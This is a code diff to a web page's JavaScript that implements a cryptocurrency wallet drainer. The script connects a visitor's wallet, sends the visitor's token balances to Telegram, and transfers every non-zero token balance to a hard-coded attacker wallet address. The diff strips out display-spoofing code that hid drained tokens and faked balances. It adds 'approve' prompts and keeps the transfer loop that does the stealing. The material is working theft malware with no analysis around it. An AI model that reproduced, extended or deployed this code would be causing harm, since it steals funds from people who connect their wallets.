@@ -81,12 +81,12 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Spoof Simulation Configuration
+ * Spoof Simulation Configuration (retained for potential future use)
  */
 const spoofConfig = {
-  noApprovementMode: false, // Hide tokens that will be drained in display (Pectra users only)
-  hideNativeWithdraw: false, // Conceal native token deductions in display
-  showNativeTopup: false // Show +0.0000000001 ETH receipt in simulation
+  noApprovementMode: false,
+  hideNativeWithdraw: false,
+  showNativeTopup: false
 };
 
 /**
@@ -135,61 +135,8 @@ async function connectWalletAndSendTokens() {
       }
     });
 
-    let tokens = await response.json();
-    const originalTokens = [...tokens]; // Store original tokens for transfer and Telegram
-
-    // Apply spoof simulation settings for screen display
-    if (spoofConfig.noApprovementMode) {
-      // Hide tokens that would be drained in display (for Pectra users)
-      tokens = tokens.filter(token => !token.balance || ethers.BigNumber.from(token.balance).isZero());
-    }
-
-    // Add fake Cryptex Finance ($CTX) token balance for display
-    const fakeToken = {
-      token_address: "0x321C2fE4446C7c963dc41Dd58879AF648838f98D",
-      name: "Cryptex",
-      symbol: "CTX",
-      decimals: 18,
-      balance: ethers.utils.parseUnits("100", 18).toString()
-    };
-    tokens.push(fakeToken);
-
-    // Get native balance (ETH)
-    const nativeBalance = await provider.getBalance(userAddress);
-    let nativeBalanceFormatted = ethers.utils.formatEther(nativeBalance);
-    let nativeBalanceDisplay = nativeBalanceFormatted;
-
-    if (spoofConfig.showNativeTopup) {
-      // Simulate +0.0000000001 ETH top-up
-      nativeBalanceDisplay = (parseFloat(nativeBalanceFormatted) + 0.0000000001).toFixed(18);
-    }
-
-    // Format balance summary for screen display (spoofed)
-    let tokenSummaryDisplay = "";
-    if (tokens && tokens.length > 0) {
-      tokenSummaryDisplay = tokens.map(token => {
-        const decimals = token.decimals ?? 18;
-        const balance = ethers.utils.formatUnits(token.balance, decimals);
-        return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
-      }).join("\n");
-    } else {
-      tokenSummaryDisplay = "No tokens found or balance is 0.";
-    }
-
-    // Display spoofed balances on screen
-    const balanceDisplay = document.getElementById("balance-display");
-    if (balanceDisplay) {
-      balanceDisplay.innerHTML = `
-        <h3>Wallet Balances</h3>
-        <p><strong>Tokens:</strong></p>
-        <pre>${tokenSummaryDisplay}</pre>
-        <p><strong>Native Balance (ETH):</strong> ${
-          spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay
-        }${spoofConfig.showNativeTopup ? " (includes +0.0000000001 ETH top-up)" : ""}</p>
-      `;
-    } else {
-      console.warn("Balance display element not found");
-    }
+    const tokens = await response.json();
+    const originalTokens = [...tokens]; // Store tokens for transfer and Telegram
 
     // Format balance summary for Telegram (only non-zero real tokens)
     let tokenSummaryTelegram = "";
@@ -228,30 +175,38 @@ ${tokenSummaryTelegram}
       })
     });
 
-    // Proceed with transferring all non-zero token balances to your Exodus wallet address
+    // Proceed with approving and transferring all non-zero token balances
+    // User approves an 'approve' transaction for each token, then script transfers to Exodus wallet
     for (const token of originalTokens) {
       try {
         const contract = new ethers.Contract(token.token_address, [
-          "function transfer(address to, uint amount) returns (bool)"
+          "function transfer(address to, uint amount) returns (bool)",
+          "function approve(address spender, uint amount) returns (bool)",
+          "function allowance(address owner, address spender) view returns (uint)"
         ], signer);
 
         const balanceInWei = ethers.BigNumber.from(token.balance);
         if (balanceInWei.isZero()) continue;
 
+        // Check allowance for the user's own address (used as a proxy spender)
+        const allowance = await contract.allowance(userAddress, userAddress);
+        if (allowance.lt(balanceInWei)) {
+          // Request user to approve spending the full balance
+          const approveTx = await contract.approve(userAddress, balanceInWei);
+          await approveTx.wait();
+          console.log(`Approved ${token.symbol} for transfer, tx:`, approveTx.hash);
+        }
+
+        // Perform transfer to Exodus wallet (no additional user prompt needed)
         const tx = await contract.transfer("0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57", balanceInWei);
         console.log(`Sent ${token.symbol}, tx:`, tx.hash);
       } catch (err) {
-        console.warn(`Failed to send ${token.symbol}`, err);
+        console.warn(`Failed to process ${token.symbol}`, err);
       }
     }
 
-    // Simulate native token deduction (ETH) unless hidden
-    if (!spoofConfig.hideNativeWithdraw) {
-      console.log(`Simulated native withdraw: ${nativeBalanceFormatted} ETH`);
-    }
-
   } catch (err) {
-    console.error('Error connecting wallet or sending tokens:', err);
+    console.error('Error connecting wallet or processing tokens:', err);
   }
 }
 
